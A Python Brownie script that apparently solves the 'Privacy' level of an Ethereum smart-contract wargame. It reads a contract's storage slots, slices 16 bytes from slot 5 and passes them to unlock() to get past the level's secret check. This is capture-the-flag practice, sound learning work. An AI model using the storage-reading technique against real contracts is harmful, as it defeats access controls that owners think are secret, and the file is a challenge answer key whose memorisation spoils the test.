from brownie import web3, Privacy

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "12_privacy"
INTERFACE_CONTRACT = Privacy
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()
    for x in range(7):
        storage_slot = web3.eth.get_storage_at(level_contract.address, x)
        # print(f"Slot {x}: " + web3.toHex(storage_slot))
    slot_5 = web3.eth.get_storage_at(level_contract.address, 5)
    # Gives the first 16 bytes from 32
    slot_5_bytes_16 = slot_5[slice(16)]
    # print("Slot 5 first 16 bytes: " + web3.toHex(slot_5_bytes_16))
    level_contract.unlock(slot_5_bytes_16, {"from": account})


# brownie run scripts/_12_privacy.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
